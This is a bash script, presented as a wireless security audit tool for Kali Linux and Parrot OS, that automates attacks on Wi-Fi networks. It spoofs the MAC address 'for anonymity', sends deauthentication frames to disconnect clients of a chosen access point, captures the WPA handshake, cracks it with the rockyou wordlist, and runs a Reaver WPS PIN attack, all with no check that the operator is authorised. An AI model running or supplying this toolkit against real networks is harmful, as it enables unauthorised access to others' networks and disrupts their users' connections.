#!/bin/bash
# Advanced Wireless Audit Script
# For Kali Linux and Parrot OS
# Performs comprehensive wireless security assessment

# Configuration
OUTPUT_DIR="/tmp/wireless_audit"
AIRODUMP_TIME=60
HANDSHAKE_TIMEOUT=120
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Check root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root (required for wireless operations)"
    exit 1
fi

# Check required tools
REQUIRED_TOOLS=("aircrack-ng" "airodump-ng" "aireplay-ng" "iwconfig" "macchanger")
for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v $tool &> /dev/null; then
        echo "Error: $tool is not installed. Please install aircrack-ng suite."
        exit 1
    fi
done

# Create output directory
mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR" || exit 1

# Function to cleanup on exit
cleanup() {
    echo "Cleaning up..."
    killall airodump-ng 2>/dev/null
    airmon-ng stop "$MONITOR_IFACE" 2>/dev/null
    if [ -n "$ORIGINAL_MAC" ] && [ -n "$WIFI_IFACE" ]; then
        macchanger -p "$WIFI_IFACE" 2>/dev/null
    fi
    exit 0
}

trap cleanup INT TERM

# Get wireless interface
get_interface() {
    echo "Available wireless interfaces:"
    iwconfig 2>/dev/null | grep "IEEE 802.11" | awk '{print $1}'
    read -p "Enter wireless interface: " WIFI_IFACE
    
    if ! iwconfig "$WIFI_IFACE" 2>/dev/null | grep -q "IEEE 802.11"; then
        echo "Invalid wireless interface: $WIFI_IFACE"
        exit 1
    fi
}

# Put interface in monitor mode
setup_monitor() {
    echo "Setting up monitor mode on $WIFI_IFACE..."
    
    # Save original MAC address
    ORIGINAL_MAC=$(macchanger -s "$WIFI_IFACE" | grep "Current MAC" | awk '{print $3}')
    
    # Kill conflicting processes
    airmon-ng check kill > /dev/null 2>&1
    
    # Start monitor mode
    airmon-ng start "$WIFI_IFACE" > /dev/null 2>&1
    MONITOR_IFACE="${WIFI_IFACE}mon"
    
    # Change MAC address for anonymity
    macchanger -A "$MONITOR_IFACE" > /dev/null 2>&1
    
    echo "Monitor interface: $MONITOR_IFACE"
}

# Scan for networks
scan_networks() {
    echo "Scanning for wireless networks (timeout: ${AIRODUMP_TIME}s)..."
    airodump-ng -w scan --output-format csv "$MONITOR_IFACE" > /dev/null 2>&1 &
    AIRODUMP_PID=$!
    
    sleep "$AIRODUMP_TIME"
    kill "$AIRODUMP_PID" 2>/dev/null
    
    # Parse results
    echo -e "\nFound networks:"
    echo "BSSID              | Channel | Power | Encryption | ESSID"
    echo "---------------------------------------------------------"
    
    # Process CSV file
    tail -n +2 scan-01.csv | grep -v 'Station MAC' | tr -d ' ' | while IFS=, read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        if [ -n "$bssid" ] && [ "$bssid" != "BSSID" ]; then
            printf "%-18s | %-7s | %-5s | %-10s | %s\n" "$bssid" "$channel" "$power" "$privacy" "$essid"
        fi
    done
}

# Capture handshake
capture_handshake() {
    read -p "Enter target BSSID: " TARGET_BSSID
    read -p "Enter target channel: " TARGET_CHANNEL
    read -p "Enter target ESSID: " TARGET_ESSID
    
    echo "Starting handshake capture on $TARGET_BSSID..."
    
    # Start airodump-ng on target channel
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w handshake "$MONITOR_IFACE" > /dev/null 2>&1 &
    AIRODUMP_PID=$!
    
    # Wait for client detection
    echo "Waiting for clients..."
    sleep 30
    
    # Deauth attack to capture handshake
    echo "Attempting deauthentication attack..."
    aireplay-ng -0 10 -a "$TARGET_BSSID" "$MONITOR_IFACE" > /dev/null 2>&1
    
    # Wait for handshake
    echo "Waiting for handshake (timeout: ${HANDSHAKE_TIMEOUT}s)..."
    for i in $(seq 1 "$HANDSHAKE_TIMEOUT"); do
        if aircrack-ng handshake-01.cap 2>/dev/null | grep -q "Handshake"; then
            echo "Handshake captured successfully!"
            kill "$AIRODUMP_PID" 2>/dev/null
            return 0
        fi
        sleep 1
    done
    
    echo "Failed to capture handshake within timeout"
    kill "$AIRODUMP_PID" 2>/dev/null
    return 1
}

# Crack password
crack_password() {
    if [ ! -f "handshake-01.cap" ]; then
        echo "No handshake file found. Capture a handshake first."
        return 1
    fi
    
    if [ ! -f "$WORDLIST" ]; then
        echo "Wordlist not found: $WORDLIST"
        return 1
    fi
    
    echo "Starting password cracking with wordlist: $WORDLIST"
    aircrack-ng -w "$WORDLIST" handshake-01.cap
    
    if [ $? -eq 0 ]; then
        echo "Password cracked successfully!"
    else
        echo "Password not found in wordlist."
    fi
}

# WPS attack
wps_attack() {
    read -p "Enter target BSSID: " TARGET_BSSID
    read -p "Enter target channel: " TARGET_CHANNEL
    
    echo "Starting WPS attack on $TARGET_BSSID..."
    
    # Check if reaver is available
    if ! command -v reaver &> /dev/null; then
        echo "Reaver is not installed. Installing..."
        apt-get update && apt-get install -y reaver
    fi
    
    # Launch reaver
    reaver -i "$MONITOR_IFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -vv
    
    if [ $? -eq 0 ]; then
        echo "WPS attack completed successfully!"
    else
        echo "WPS attack failed."
    fi
}

# Show menu
show_menu() {
    echo -e "\nWireless Audit Menu:"
    echo "1. Scan for networks"
    echo "2. Capture handshake"
    echo "3. Crack password"
    echo "4. WPS attack"
    echo "5. Full audit (scan + handshake + crack)"
    echo "6. Exit"
}

# Main execution
get_interface
setup_monitor

while true; do
    show_menu
    read -p "Select option: " choice
    
    case $choice in
        1) scan_networks ;;
        2) capture_handshake ;;
        3) crack_password ;;
        4) wps_attack ;;
        5)
            scan_networks
            if capture_handshake; then
                crack_password
            fi
            ;;
        6) cleanup ;;
        *) echo "Invalid option" ;;
    esac
done
